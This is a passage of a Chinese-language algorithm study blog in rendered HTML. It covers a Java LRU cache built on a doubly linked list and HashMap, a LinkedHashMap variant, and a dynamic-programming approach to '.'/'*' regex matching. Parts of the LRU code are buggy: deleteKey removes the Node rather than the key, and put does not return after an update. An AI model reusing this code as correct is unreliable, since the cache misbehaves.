class="keyword">public</span> <span class="title">DoubleList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//初始化双向链表数据</span></span><br><span class="line">        head = <span class="keyword">new</span> Node(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> Node(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *    在链表尾部添加节点x, 时间O(1)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 被添加节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span>  <span class="title">addLast</span><span class="params">(Node x)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将被插入位置的节点记录为x的记录</span></span><br><span class="line">        x.prev = tail.prev;</span><br><span class="line">        <span class="comment">//将tail 节点变成x的next 节点</span></span><br><span class="line">        x.next = tail;</span><br><span class="line">        tail.prev.next = x;</span><br><span class="line">        tail.prev = x;</span><br><span class="line">        size ++ ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除链表种 的x节点(x一定存在)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x</span></span><br><span class="line"><span class="comment">     * 由于是双链表且给的是目标Node节点, 时间 O(1)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Node x)</span></span>&#123;</span><br><span class="line">        <span class="comment">//x的前一个节点</span></span><br><span class="line">        x.prev.next = x.next;</span><br><span class="line">        <span class="comment">//x的后一个节点</span></span><br><span class="line">        x.next.prev = x.prev;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 溢出链表中第一个节点, 并返回该节点, 时间O(1)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 被删除的第一个节点</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Node <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head.next==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Node first = head.next;</span><br><span class="line">        remove(first);</span><br><span class="line">        <span class="keyword">return</span>  first;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 链表长度</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>,来实现 LRU 算法的get 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!map.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将该数据提升为最近使用的</span></span><br><span class="line">    makeRecently(key);</span><br><span class="line">    <span class="keyword">return</span> map.get(key).val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><p>put 方法比较复杂 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/put.jpg" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(map.containsKey(key))&#123;</span><br><span class="line">           <span class="comment">//删除旧的数据</span></span><br><span class="line">           deleteKey(key);</span><br><span class="line">           <span class="comment">//新插入的数据为最近使用的数据</span></span><br><span class="line">           addRecently(key,val);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(cap == cache.size())&#123;</span><br><span class="line">           <span class="comment">//删除最久未使用的元素</span></span><br><span class="line">           removeLeastRecently();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//添加为最近使用的元素</span></span><br><span class="line">       addRecently(key,val);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>完整 LRU</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LRU;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.interfaces.ECKey;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> badpoone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key -&gt; Nodde(key,val)</span></span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Integer, Node&gt; map;</span><br><span class="line">    <span class="comment">//Node(k1</span></span><br><span class="line">    <span class="comment">// ,v1) &lt;-&gt; Node(k2,v2) ...</span></span><br><span class="line">    <span class="keyword">private</span> DoubleList cache ;</span><br><span class="line">    <span class="comment">//最大容量</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> cap;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;( );</span><br><span class="line">        cache = <span class="keyword">new</span> DoubleList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  将某个key提升为最近使用的   */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title">makeRecently</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        Node x=map.get(key);</span><br><span class="line">        <span class="comment">//先从链表中删除这个节点</span></span><br><span class="line">        cache.remove(x);</span><br><span class="line">        <span class="comment">//重新插到队尾</span></span><br><span class="line">        cache.addLast(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加最近使用的元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addRecently</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        Node x = <span class="keyword">new</span> Node(key,val);</span><br><span class="line">        <span class="comment">//链表尾就是最近使用的元素</span></span><br><span class="line">        cache.addLast(x);</span><br><span class="line">        <span class="comment">// 在map中添加key 的映射</span></span><br><span class="line">        map.put(key,x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key  删除某一个key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deleteKey</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        Node x = map.get(key);</span><br><span class="line">        <span class="comment">//从链表中删除</span></span><br><span class="line">        cache.remove(x);</span><br><span class="line">        <span class="comment">//从map中删除</span></span><br><span class="line">        map.remove(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除最久未使用的元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeLeastRecently</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//链表头部的第一个元素就是最久未使用的</span></span><br><span class="line">        Node deleteNode = cache.removeFirst();</span><br><span class="line">        <span class="comment">//同时别忘了从高map中 删除它的key</span></span><br><span class="line">        <span class="keyword">int</span> deletedKey = deleteNode.key;</span><br><span class="line">        map.remove(deletedKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!map.containsKey(key))&#123;</span><br><span class="line">            <span class="keyword">return</span>  -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将该数据提升为最近使用的</span></span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span>  map.get(key).val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(key))&#123;</span><br><span class="line">            <span class="comment">//删除旧的数据</span></span><br><span class="line">            deleteKey(key);</span><br><span class="line">            <span class="comment">//新插入的数据为最近使用的数据</span></span><br><span class="line">            addRecently(key,val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(cap == cache.size())&#123;</span><br><span class="line">            <span class="comment">//删除最久未使用的元素</span></span><br><span class="line">            removeLeastRecently();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//添加为最近使用的元素</span></span><br><span class="line">        addRecently(key,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用内置LinkedHashMap实现"><a href="#使用内置LinkedHashMap实现" class="headerlink" title="使用内置LinkedHashMap实现"></a>使用内置LinkedHashMap实现</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> LRU;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> badpoone</span></span><br><span class="line"><span class="comment"> * 使用java内置类型LinkedHashMap实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRU</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cap;</span><br><span class="line">    LinkedHashMap&lt;Integer,Integer&gt; cache = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRU</span><span class="params">(<span class="keyword">int</span> captity)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cap = captity;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!cache.containsKey(key))&#123;</span><br><span class="line">            <span class="keyword">return</span>  -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将key 变为最近使用</span></span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cache.containsKey(key))&#123;</span><br><span class="line">            <span class="comment">//修改key 值</span></span><br><span class="line">            cache.put(key,val);</span><br><span class="line">            <span class="comment">//将key 变为最近使用</span></span><br><span class="line">            makeRecently(key);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cache.size() &gt;= <span class="keyword">this</span>.cap)&#123;</span><br><span class="line">            <span class="comment">//链表头部为最久未使用的key</span></span><br><span class="line">            <span class="keyword">int</span> oldestKey = cache.keySet().iterator().next();</span><br><span class="line">            cache.remove(oldestKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将新的key 添加到 链表尾部</span></span><br><span class="line">        cache.put(key,val);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeRecently</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = cache.get(key);</span><br><span class="line">        <span class="comment">//删除key ,重新插入队尾</span></span><br><span class="line">        cache.remove(key);</span><br><span class="line">        cache.put(key,val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="正则表达"><a href="#正则表达" class="headerlink" title="正则表达"></a>正则表达</h3><p>其中点号「.」可以匹配任意一个字符，星号「*」可以让之前的那个字符重复任意次数（包括 0 次）</p><p>模式串 “.a*b” 可以匹配文本”zaaab”,也可以匹配”cb” : </p><p>模式串”a..b” 可以匹配文本 “amnb” ,</p><p>模式串”.*” 可以匹配任何文本</p><p>函数签名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">bool <span class="title">isMatch</span><span class="params">(string s, string p)</span></span>;</span><br></pre></td></tr></table></figure><p> 遇到 , 通配符, 无脑匹配 </p><p>遇到 * 通配符, 前面的字符可以选择重复一次, 可以重复多次, 也可以一次都不出现,</p><p>全部穷举一遍, 只要有一种情况可以完成匹配, 就认为 p可以匹配 s. 设计到两个字符串的穷举, 我们可以想到动态规划的技巧 </p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>s 和 p相互匹配的过程大致是: 两个指针i, j分别再 s 和 p 上移动, 如果最后两个指针都能移动到字符串的末尾, 那么就匹配成功, 反之则匹配失败</p><p>先不考虑 * 通配符 , 面对两个待匹配字符 s[i] 和 p[j], 我们唯一能做的就是看他俩是否匹配 </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; j &lt; p.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="comment">// 「.」通配符就是万金油</span></span><br><span class="line">        <span class="keyword">if</span> (s[i] == p[j] || p[j] == <span class="string">'.'</span>) &#123;</span><br><span class="line">            <span class="comment">// 匹配，接着匹配 s[i+1..] 和 p[j+1..]</span></span><br><span class="line">            i++; j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 不匹配</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i == j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当p[j+1]为* 通配符时,分情况讨论</p><ol><li>如果s[i]==p[j] ,那么有两种情况:</li></ol><p>1.1 <code>p[j]</code> 有可能会匹配多个字符，比如 <code>s = &quot;aaa&quot;, p = &quot;a*&quot;</code>，那么 <code>p[0]</code> 会通过 <code>*</code> 匹配 3 个字符 <code>&quot;a&quot;</code>。</p><p>1.2 <code>p[i]</code> 也有可能匹配 0 个字符，比如 <code>s = &quot;aa&quot;, p = &quot;a*aa&quot;</code>，由于后面的字符可以匹配 <code>s</code>，所以 <code>p[0]</code> 只能匹配 0 次。</p><p>2.如果s[i] !=p[j] , 只有一种情况: </p><p><code>p[j]</code> 只能匹配 0 次，然后看下一个字符是否能和 <code>s[i]</code> 匹配。比如说 <code>s = &quot;aa&quot;, p = &quot;b*aa&quot;</code>，此时 <code>p[0]</code> 只能匹配 0 次。</p><p>综上, 可以把之前的代码针对 * 通配符进行一下改造 :</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s[i] == p[j] || p[j] == <span class="string">'.'</span>) &#123;</span><br><span class="line">    <span class="comment">// 匹配</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; p.<span class="built_in">size</span>() - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">        <span class="comment">// 有 * 通配符，可以匹配 0 次或多次</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 无 * 通配符，老老实实匹配 1 次</span></span><br><span class="line">        i++; j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不匹配</span></span><br><span class="line">    <span class="keyword">if</span> (j &lt; p.<span class="built_in">size</span>() - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">        <span class="comment">// 有 * 通配符，只能匹配 0 次0</span></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 无 * 通配符，匹配无法进行下去了</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在的问题是, 遇到 *通配符时, 是匹配0次还是多次 ?多次是几次?</p><p>做选择 , 要把所有可能的选择都穷举一遍才能得出结果,动态规划算法的核心就是状态和选择 ,     </p><p><strong>「状态」无非就是 <code>i</code> 和 <code>j</code> 两个指针的位置，「选择」就是 <code>p[j]</code> 选择匹配几个字符</strong>。</p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>根据[状态] . 我们可以定义一个dp函数 :</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dp</span><span class="params">(<span class="keyword">String</span> &amp;s,<span class="keyword">int</span> i, <span class="keyword">String</span>&amp; p,<span class="keyword">int</span> j)</span></span>;</span><br></pre></td></tr></table></figure><p><code>dp</code> 函数的定义如下：</p><p><strong>若 <code>dp(s, i, p, j) = true</code>，则表示 <code>s[i..]</code> 可以匹配 <code>p[j..]</code>；若 <code>dp(s, i, p, j) = false</code>，则表示 <code>s[i..]</code> 无法匹配 <code>p[j..]</code></strong>。</p><p>根据这个定义，我们想要的答案就是 <code>i = 0, j = 0</code> 时 <code>dp</code> 函数的结果，所以可以这样使用这个 <code>dp</code> 函数：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bool</span> isMatch(<span class="built_in">string</span> s, <span class="built_in">string</span> p) &#123;</span><br><span class="line">    <span class="comment">// 指针 i，j 从索引 0 开始移动</span></span><br><span class="line">    <span class="keyword">return</span> dp(s, <span class="number">0</span>, p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以根据之前代码写出dp 函数的主要逻辑 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">bool <span class="title">dp</span><span class="params">(string&amp; s, <span class="keyword">int</span> i, string&amp; p, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j] || p[j] == <span class="string">'.'</span>) &#123;</span><br><span class="line">        <span class="comment">// 匹配</span></span><br><span class="line">        <span class="keyword">if</span> (j &lt; p.size() - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="comment">// 1.1 通配符匹配 0 次或多次</span></span><br><span class="line">            <span class="keyword">return</span> dp(s, i, p, j + <span class="number">2</span>)</span><br><span class="line">                || dp(s, i + <span class="number">1</span>, p, j);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 1.2 常规匹配 1 次</span></span><br><span class="line">            <span class="keyword">return</span> dp(s, i + <span class="number">1</span>, p, j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 不匹配</span></span><br><span class="line">        <span class="keyword">if</span> (j &lt; p.size() - <span class="number">1</span> &amp;&amp; p[j + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">            <span class="comment">// 2.1 通配符匹配 0 次</span></span><br><span class="line">            <span class="keyword">return</span> dp(s, i, p, j + <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 2.2 无法继续匹配</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 dp函数定义  ,解释上面几种情况</p><p>1.1 通配符匹配 0 次或多次 </p><p>将 j 加 2 , i 不变, 含义就是直接跳过 p[j] 和之后的通配符, 即通配符匹配0 次: </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210525093139151.png" alt="image-20210525093139151"></p><p>将 i 加 1 , j 不变 , 含义就是p[j] 匹配了s[i] , 但p[j] 还可以继续匹配 ,即通配符匹配多次的情况 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210525133839423.png" alt="image-20210525133839423"></p><p>两种情况只要有一种可以完成匹配即可,所以对上面两种情况求或运算 </p><p>1.2常规匹配一次</p><p>由于这个条件是无 * 的常规匹配, 那么如果 s[i]==p[j],就是i 和 j分别 +1 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210525134455666.png" alt="image-20210525134455666"></p><p>2.通配符匹配0 次 </p><p>类似情况1.1, 将j+2, i不变 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210525134523208.png" alt="image-20210525134523208"></p><p>2.2 如果没有 ***** 通配符,也无法匹配 ,那么只能说明匹配失败了 : </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210525134612750.png" alt="image-20210525134612750"></p><p>现在思考dp 函数的 base case </p><p>一个base case 是 j == p.length() 时, 按照dp 函数的定义,这意味着模式串 p已经被匹配完了, 那么应该看文本串 s 匹配 到哪里了, 如果 s也恰好被匹配完, 则说明匹配成功 </p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">j</span>==p.<span class="built_in">length</span>())&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">i</span>==s.<span class="built_in">length</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 另一个 base case是 i == s.length()时, 按照dp函数的定义, 这种情况意味着 文本串 s 已经被全部匹配了, 那么接下来需要怎么做? </p><p>只要简单地检查一下p是否也匹配玩就行了嘛 ? </p><figure class="highlight glsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i==s.<span class="built_in">length</span>())&#123;</span><br><span class="line"><span class="comment">//just do this ? </span></span><br><span class="line"><span class="keyword">return</span> j == p.<span class="built_in">length</span>();</span><br><span 